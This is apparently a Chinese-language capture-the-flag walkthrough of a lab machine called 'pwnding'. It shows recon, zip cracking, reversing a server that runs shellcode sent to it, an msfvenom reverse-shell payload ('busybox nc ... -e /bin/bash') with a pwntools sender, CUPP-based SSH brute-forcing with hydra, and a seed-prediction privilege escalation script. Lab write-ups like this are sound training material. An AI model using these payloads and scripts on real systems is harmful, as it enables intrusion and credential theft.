# 一、信息收集

## 1.1 主机发现

使用 `arp-scan` 扫描局域网内的存活主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.239 08:00:27:37:7a:55       PCS Systemtechnik GmbH
...
```

确定目标主机 IP 为 `192.168.205.239`。

## 1.2 端口扫描

使用 `nmap` 对目标进行全端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.239
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6666/tcp open  irc
...
```

发现三个开放端口：

- **22/tcp**：SSH 服务
- **80/tcp**：HTTP 服务
- **6666/tcp**：可疑服务（IRC 端口，但实际可能是自定义服务）

## 1.3 服务探测

### 1.3.1 6666 端口探测

使用 `nc` 连接 6666 端口：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc 192.168.205.239 6666     
id
Hackers, get out of my machine
[*] 等待客户端连接...
```

该端口会过滤某些输入，返回警告信息。

### 1.3.2 HTTP 服务探测

使用 `curl` 访问 Web 服务：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.239
...
<h1>Don't Hack Me</h1>
<p>Enumerating directories on my server would ruin everything</p>
...
```

页面提示需要进行目录枚举。

# 二、Web 渗透

## 2.1 目录扫描

使用 `gobuster` 进行目录枚举，并排除默认页面长度：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gobuster dir -u http://192.168.205.239 -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64 --exclude-length 11618 
...
/index.html           (Status: 200) [Size: 930]
/mysecret.txt         (Status: 200) [Size: 383]
...
```

发现关键文件 `/mysecret.txt`。

## 2.2 获取线索

访问提示文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.239/mysecret.txt       
Go to the most evil port.
You will get what you want.
Please be gentle with him, maybe he will be afraid.
In order to obtain its source code.
Perhaps you will need the dictionary below.

去那个最邪恶的端口。
你会得到你想要的。
请对他温柔一点，也许它会害怕。
为了得到它的源码。
也许你会需要下面的字典。

/YTlPX4d2UENbWnI.txt
```

**关键信息**：

- "最邪恶的端口" 指 **6666 端口**（"666" 魔鬼数字）
- 需要使用特定字典进行枚举
- 目标是获取源代码

## 2.3 获取自定义字典

下载提示中的字典文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.239/YTlPX4d2UENbWnI.txt -O
...

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat YTlPX4d2UENbWnI.txt
ta0
lingmj
bamuwe
todd
ll104567
primary
lvzhouhang
qiaojojo
flower
```

## 2.4 使用自定义字典扫描

使用获取的字典继续目录枚举：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gobuster dir -u http://192.168.205.239 -k -w YTlPX4d2UENbWnI.txt -x php,txt,html,zip,db,bak -t 64 --exclude-length 11618 
...
/ll104567.zip         (Status: 200) [Size: 739584]
/ll104567             (Status: 200) [Size: 739584]
...
```

成功找到压缩包 `ll104567.zip`。

# 三、二进制程序分析

## 3.1 破解压缩包

### 3.1.1 提取 hash

使用 `zip2john` 提取密码 hash：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ zip2john ll104567.zip > hash
ver 2.0 efh 5455 efh 7875 ll104567.zip/opt/server PKZIP Encr: TS_chk, cmplen=739398, decmplen=2120576, crc=1B8B19DF ts=4118 cs=4118 type=8
```

### 3.1.2 爆破密码

使用 `john` 结合 `rockyou.txt` 字典爆破：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
...
oooooo           (ll104567.zip/opt/server)
...
```

密码为 `oooooo`。

### 3.1.3 解压文件

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ unzip ll104567.zip
Archive:  ll104567.zip
[ll104567.zip] opt/server password: oooooo
  inflating: opt/server

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ file opt/server                                                    
opt/server: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=db87ec3af59f50fcd961031784692ff086072fd2, not stripped
```

这是一个 64 位静态链接的 ELF 可执行文件，未脱符号。

## 3.2 逆向分析

使用 IDA Pro 反编译 `main` 函数，核心逻辑如下：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  // ... 变量声明省略 ...

  v22 = socket(2LL, 1LL, 0LL);  // 创建 socket
  // ...
  v13[1] = ntohs(6666LL);  // 监听 6666 端口
  bind(v22, v13, 16LL);
  listen(v22, 5LL);

  while (1) {
    v21 = accept(v22, 0LL, 0LL);  // 接受连接
    dup2(v21, 0LL);  // 重定向标准输入
    dup2(v21, 1LL);  // 重定向标准输出
    dup2(v21, 2LL);  // 重定向标准错误
  
    v20 = read(0LL, v11, 4096LL);  // 读取输入
  
    // 检查输入是否包含禁用字符
    for (i = 0; v25 && v20 > i; ++i) {
      v19 = &forbidden_bytes;
      v23 = (char *)&forbidden_bytes;
      while (v23 != v18) {
        v17 = *v23;
        if (v17 == v11[i])  // 发现禁用字符
          break;
        ++v23;
      }
      if (!v25)
        break;
    }
  
    if (!v25) {
      write(1LL, "Hackers, get out of my machine\n", ...);
      close(v21);
    } else {
      v15 = (void (*)(void))mmap64(0LL, v20, 7LL, 34LL, 0xFFFFFFFFLL, 0LL);
      // 分配可执行内存 (RWX)
      j_memcpy(v15, v11, v20);  // 复制 shellcode
      v15();  // 执行 shellcode
      munmap(v15, v20);
    }
  }
}
```

**关键发现**：

1. 程序监听 6666 端口
2. 接收用户输入并检查是否包含 **禁用字节**（`forbidden_bytes`）
3. 如果输入合法，将其作为 **shellcode 执行**（典型的 PWN 题）

## 3.3 提取禁用字节

在 IDA 中查看 `.rodata` 段的 `forbidden_bytes`：

```assembly
.rodata:000000000053C009 _ZL15forbidden_bytes db 0x00  ; NULL
.rodata:000000000053C00A                 db 0x20  ; 空格
.rodata:000000000053C00B                 db 0x0F  ; syscall 前缀
.rodata:000000000053C00C                 db 0xCD  ; int 指令
.rodata:000000000053C00D                 db 0x09  ; Tab
.rodata:000000000053C00E                 db 0x22  ; 双引号
```

禁用字符为：`\x00\x20\x0f\xcd\x09\x22`

# 四、Shellcode 生成与利用

## 4.1 生成编码 Shellcode

使用 `msfvenom` 生成经过编码的反向 shell payload，避开禁用字符：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ msfvenom -p linux/x64/exec CMD="busybox nc 192.168.205.128 8888 -e /bin/bash" -b '\x00\x20\x0f\xcd\x09\x22' -f python

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 127 (iteration=0)
x64/xor chosen with final size 127
Payload size: 127 bytes
Final size of python file: 640 bytes
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\xba\x33\x2b\x2a\x85"
buf += b"\x94\xad\xef\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\xf2\x8b\x04\x48\xec\xfa\x82\x9c\xd2"
buf += b"\x33\xb2\x7a\xd1\xcb\xff\x89\xd2\x1e\x48\x7e\xdb"
buf += b"\xc6\x45\xc2\xba\x33\x2b\x48\xf0\xe7\xd4\x8d\xd5"
buf += b"\x4b\x0b\x44\xe6\xb4\x9c\xd6\x88\x1d\x1a\x1c\xbd"
buf += b"\xba\x9f\xdf\x8f\x1d\x1a\x18\xbd\xb4\x95\xd7\x82"
buf += b"\x0b\x0b\x07\xe0\xb4\x82\x8d\xd3\x5d\x04\x48\xe4"
buf += b"\xe7\xc5\xef\xec\x64\x7f\x74\xef\xaf\xf5\xe0\xbf"
buf += b"\x33\x2b\x2a\x85\x94\xad\xef"
```

**编码器说明**：使用 `x64/xor` 编码器绕过字符过滤，成功生成 127 字节的 payload。

## 4.2 编写利用脚本

创建 Python 脚本发送 shellcode：

```python
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat a.py 
#!/usr/bin/env python3
from pwn import *

io = remote('192.168.205.239', 6666)

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\xba\x33\x2b\x2a\x85"
buf += b"\x94\xad\xef\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\xf2\x8b\x04\x48\xec\xfa\x82\x9c\xd2"
buf += b"\x33\xb2\x7a\xd1\xcb\xff\x89\xd2\x1e\x48\x7e\xdb"
buf += b"\xc6\x45\xc2\xba\x33\x2b\x48\xf0\xe7\xd4\x8d\xd5"
buf += b"\x4b\x0b\x44\xe6\xb4\x9c\xd6\x88\x1d\x1a\x1c\xbd"
buf += b"\xba\x9f\xdf\x8f\x1d\x1a\x18\xbd\xb4\x95\xd7\x82"
buf += b"\x0b\x0b\x07\xe0\xb4\x82\x8d\xd3\x5d\x04\x48\xe4"
buf += b"\xe7\xc5\xef\xec\x64\x7f\x74\xef\xaf\xf5\xe0\xbf"
buf += b"\x33\x2b\x2a\x85\x94\xad\xef"

io.send(buf)
io.interactive()
```

## 4.3 获取初始 Shell

在 Kali 上开启监听：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

执行利用脚本：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 a.py
[+] Opening connection to 192.168.205.239 on port 6666: Done
[*] Switching to interactive mode
```

成功获取反向 shell：

```bash
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.239] 57342
id
uid=1001(lamb) gid=1001(lamb) groups=1001(lamb)
```

## 4.4 Shell 交互优化

使用 Python PTY 获取完整交互式 Shell：

```bash
script /dev/null -c bash
# Ctrl+Z 挂起
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

# 五、权限提升

## 5.1 信息收集

查看当前用户权限：

```bash
lamb@pwnding:/home/lamb$ id
uid=1001(lamb) gid=1001(lamb) groups=1001(lamb)

lamb@pwnding:/home/lamb$ ls -al
total 28
drwxr-xr-x 2 lamb lamb 4096 Feb 24  2025 .
drwxr-xr-x 3 root root 4096 Feb 19  2025 ..
lrwxrwxrwx 1 lamb lamb    9 Feb 19  2025 .bash_history -> /dev/null
-rw-r--r-- 1 lamb lamb  220 Feb 19  2025 .bash_logout
-rw-r--r-- 1 lamb lamb 3526 Feb 19  2025 .bashrc
-rw-r--r-- 1 lamb lamb  807 Feb 19  2025 .profile
-rw------- 1 lamb lamb    0 Feb 20  2025 .viminfo
-rw-r--r-- 1 root root  528 Feb 24  2025 this_is_a_tips.txt
-rw-r--r-- 1 lamb lamb   39 Feb 24  2025 use3e3e3e3e3sr.txt
```

查看提示文件：

```bash
lamb@pwnding:/home/lamb$ cat this_is_a_tips.txt
There is a fun tool called cupp.
I heard it's a good social engineering dictionary generator.
Are there really people that stupid these days? haha.
There is only one way to become ROOT, which is to execute getroot!!!
And don't forget, this is a PWN type machine.

有一个很好玩的工具叫做 cupp.
听说那是一个不错的社会工程学字典生成器.
现在真的还会有人这么蠢吗？haha.
成为 ROOT 的方法只有一条，就是执行 getroot !!!
而且你不要忘记了，这是一个pwn类型的机器.
```

**关键信息**：

1. 使用 **CUPP** 工具生成社工字典
2. 需要执行 **getroot** 程序提权
3. 这是一个 PWN 类型靶机

获取 user flag：

```bash
lamb@pwnding:/home/lamb$ cat use3e3e3e3e3sr.txt
flag{3a463d08f2ae11efbeb6000c29094b2d}
```

## 5.2 定位目标程序

查找 `getroot` 程序：

```bash
lamb@pwnding:/home/lamb$ which getroot
/usr/local/bin/getroot

lamb@pwnding:/home/lamb$ ls -al /usr/local/bin/getroot
-rwxr-xr-x 1 root root 18912 Feb 20  2025 /usr/local/bin/getroot
```

将程序传输到本地分析：

```bash
lamb@pwnding:/home/lamb$ scp /usr/local/bin/getroot kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
The authenticity of host '192.168.205.128 (192.168.205.128)' can't be established.
ECDSA key fingerprint is SHA256:z6Ys7WzLIJn/dntTjJvwO8pWKH0KBLQeJKftYoClt3c.
Are you sure you want to continue connecting (yes/no)? yes
...
kali@192.168.205.128's password: 
getroot                                                                                                                                         100%   18KB   3.3MB/s   00:00
```

## 5.3 社工字典生成

### 5.3.1 寻找线索

搜索系统中的隐藏文件：

```bash
lamb@pwnding:/home/lamb$ ls -al /var/backups/
total 24
drwxr-xr-x  3 root root  4096 Feb 21  2025 .
drwxr-xr-x 12 root root  4096 Feb 19  2025 ..
drwxr-xr-x  3 root root  4096 Feb 19  2025 .secret
-rw-r--r--  1 root root 11092 Feb 19  2025 apt.extended_states.0

lamb@pwnding:/home/lamb$ cat /var/backups/.secret/.verysecret/.noooooo/note2.txt
The Compass and the Campfire

David knelt beside his ten-year-old son, Jake, their shared backpack spilling onto the forest floor. "Lost?" Jake whispered, staring at the identical trees clawing at the twilight. David's calloused fingers brushed the cracked compass in his palm—a relic from his father, its needle trembling like a moth. "Not lost," he lied. "Just… rerouting."

Jake's eyes narrowed, too sharp for comfort. "Your compass is broken."

A chuckle escaped David, brittle as dry leaves. "Compasses don't break, bud. They… forget." He flipped it open, the glass fogged with age. "See? North isn't where it should be. It's where it chooses to be tonight."

The boy frowned, then yelped as a pinecone thudded beside him. A red squirrel chattered overhead, its tail flicking like a metronome. Jake's fear dissolved into giggles. David watched, throat tight. He's still young enough to laugh at squirrels.

"Dad?" Jake unzipped his jacket, revealing three granola bars and a glowstick. "We've got supplies. Let's build a fort."

They wove branches into a crooked shelter, Jake's hands steady where David's shook. When the first stars pierced the canopy, David confessed: "Grandpa gave me this compass the day I got lost in the mall. Told me it'd always point home."

Jake snapped the glowstick, bathing their fort in alien green. "Does it work now?"

The needle quivered, settling northwest. Toward the distant highway hum, not their cabin's woodsmoke. David closed the brass lid. "Nope. But you do." He nodded at Jake's pocket—where a crumpled trail map peeked out, dotted with the boy's doodled dinosaurs.

Dawn found them at the cabin's porch, guided by Jake's roars laughter and the squirrels he'd named "Sir Nibbles". The compass stayed in David's pocket, its secret safe: true north had shifted years ago, anyway—from steel poles to a gap-toothed grin eating pancakes at 6 AM.
```

从故事中提取关键词：**David**、**Jake**、**compass**、**campfire**、**squirrel**、**cabin**、**SirNibbles** 等。

人物就David、Jake。

### 5.3.2 使用 CUPP 生成字典

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cupp -i
...
[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: David
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 

> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 

> Child's name: Jake
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 

> Pet's name: 
> Company name: 

> Do you want to add some key words about the victim? Y/[N]: 
> Do you want to add special chars at the end of words? Y/[N]: 
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]: 

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to david.txt, counting 212 words.
[+] Now load your pistolero with david.txt and shoot! Good luck!
```

**CUPP 知识点补充**：

- **CUPP** (Common User Passwords Profiler) 是基于社会工程学的密码字典生成工具
- 根据目标人物信息（姓名、生日、宠物名等）自动生成可能的密码组合
- 支持添加特殊字符、数字后缀、Leet 替换（如 a→4，e→3）等变换规则

### 5.3.3 SSH 密码爆破

使用生成的字典对 `lamb` 用户进行 SSH 爆破：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ hydra -l lamb -P david.txt ssh://192.168.205.239 -f -I -u -e nsr -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
...
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 215 login tries (l:1/p:215), ~4 tries per task
[DATA] attacking ssh://192.168.205.239:22/
[22][ssh] host: 192.168.205.239   login: lamb   password: ekaJ_2016
[STATUS] attack finished for 192.168.205.239 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
...
```

**成功获取密码**：`lamb:ekaJ_2016`

**密码解析**：`ekaJ` 是 `Jake` 的反转，`2016` 可能是出生年份或特殊纪念日期。

## 5.4 Sudo 权限检查

使用获取的密码检查 sudo 权限：

```bash
lamb@pwnding:/home/lamb$ sudo -l
[sudo] password for lamb: 
Matching Defaults entries for lamb on pwnding:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lamb may run the following commands on pwnding:
    (ALL : ALL) PASSWD: /usr/local/bin/getroot
```

发现 `lamb` 用户可以使用 sudo 执行 `/usr/local/bin/getroot`，需要密码验证。

## 5.5 逆向分析 getroot

使用 IDA Pro 反编译 `getroot` 的 `main` 函数：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  // ... 变量声明省略 ...

  if ( argc > 1 )
  {
    v22 = atoi(argv[1]);  // 获取用户输入的"魔术数字"
    v9 = time(0LL);
    srand(v9);  // 使用当前时间戳作为随机种子
    v21 = rand() % 86400;  // 生成 [0, 86400) 的随机数（一天的秒数）
  
    generate_normal_distribution();  // 生成正态分布值
    v20 = v3;  // 正态分布结果
    v16 = (int)(5.0 * v3) + v21;  // 计算中间值
    v17 = 86399;
    v10 = std::min<int>(&v16, &v17);  // 限制上界
    v18 = 0;
    v16 = *(_DWORD *)std::max<int>(&v18, v10);  // 限制下界 [0, 86399]
  
    std::string::basic_string(v15, "/root/cred", &v19);
  
    if ( v22 == v16 + 12345 )  // 验证：输入 == 计算值 + 12345
    {
      std::ifstream::basic_ifstream(v13, v15, 8LL);
      if ( (unsigned __int8)std::ios::operator bool(&v14) )
      {
        v11 = std::ifstream::rdbuf(v13);
        std::ostream::operator<<(&std::cout, v11);  // 输出 /root/cred 内容
      }
      std::ifstream::~ifstream(v13);
    }
    // ...
  }
  else
  {
    // 输出用法提示
    std::operator<<<std::char_traits<char>>(&std::cerr, "Usage: ", envp);
    std::operator<<<std::char_traits<char>>(v4, *argv, v4);
    std::operator<<<std::char_traits<char>>(v5, " <magic_number>", v6);
    return 1;
  }
  return v8;
}
```

**核心逻辑分析**：

1. 程序接收一个命令行参数 `magic_number`
2. 使用 **当前时间戳** 作为随机数种子
3. 生成随机数 `v21 = rand() % 86400`
4. 调用 `generate_normal_distribution()` 生成正态分布值（范围约 -3 到 3）
5. 计算：`v16 = (int)(5.0 * norm_val) + v21`，并限制在 `[0, 86399]` 范围内
6. 验证条件：`magic_number == v16 + 12345`
7. 验证成功后读取 `/root/cred` 文件（应该包含 root 密码）

**漏洞点**：

- 正态分布值范围有限（约 -3 到 3），乘以 5 后范围约 `[-15, 15]`
- 时间戳可预测，可在程序执行前后几秒内枚举所有可能的时间戳
- 每个时间戳对应的 `magic_number` 候选值只有约 31 个（-15 到 15）

## 5.6 编写 Exploit

创建 Python 脚本暴力枚举所有可能的 `magic_number`：

```bash
lamb@pwnding:/tmp$ vim a.py
lamb@pwnding:/tmp$ cat a.py 
#!/usr/bin/env python3
import subprocess
import time
import ctypes

libc = ctypes.CDLL("libc.so.6")

def calcMagic(ts):
    libc.srand(ts)
    v21 = libc.rand() % 86400
    for norm_val in range(-15, 16):
        v16 = norm_val + v21
        v16 = max(0, min(v16, 86399))
        magic = v16 + 12345
        yield magic

def exploit():
    ts = int(time.time())
    for t in range(ts - 2, ts + 3):
        for magic in calcMagic(t):
            try:
                result = subprocess.run(
                    ['sudo', '/usr/local/bin/getroot', str(magic)],
                    capture_output=True, timeout=1
                )
                if result.stdout:
                    print(f"[+] Success! ts: {t}, magic: {magic}")
                    print(result.stdout.decode())
                    return
            except:
                pass
    print("[-] Failed")

if __name__ == "__main__":
    exploit()
```

**脚本原理**：

1. 使用 Python 的 `ctypes` 调用 C 标准库的 `srand()` 和 `rand()` 函数，确保随机数生成逻辑与目标程序一致
2. 枚举当前时间前后 5 秒的时间戳（考虑到执行延迟）
3. 对每个时间戳，枚举 31 个可能的 `magic_number`（对应正态分布值 -15 到 15）
4. 调用 `sudo getroot <magic>` 尝试验证
5. 成功时输出 `/root/cred` 的内容

## 5.7 执行提权

运行 exploit 脚本：

```bash
lamb@pwnding:/tmp$ python3 a.py 
[+] Success! ts: 1759325594, magic: 84845
$1$BvrTqWyB$Soa7qkeu1GfIoy2duf53t0
```

**成功获取 root 密码**：`$1$BvrTqWyB$Soa7qkeu1GfIoy2duf53t0`

## 5.8 切换到 root

使用获取的密码切换到 root：

```bash
lamb@pwnding:/tmp$ su -
Password: $1$BvrTqWyB$Soa7qkeu1GfIoy2duf53t0
root@pwnding:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**成功提权到 root！**

# 六、获取 Flag

查找并读取 root flag：

```bash
root@pwnding:~# cat /root/ro0oo0ooo0oooo0oooo0ooo0oo0ot.txt /home/lamb/use3e3e3e3e3sr.txt 
flag{46511d58f2ae11ef9ea3000c29094b2d}
flag{3a463d08f2ae11efbeb6000c29094b2d}
```

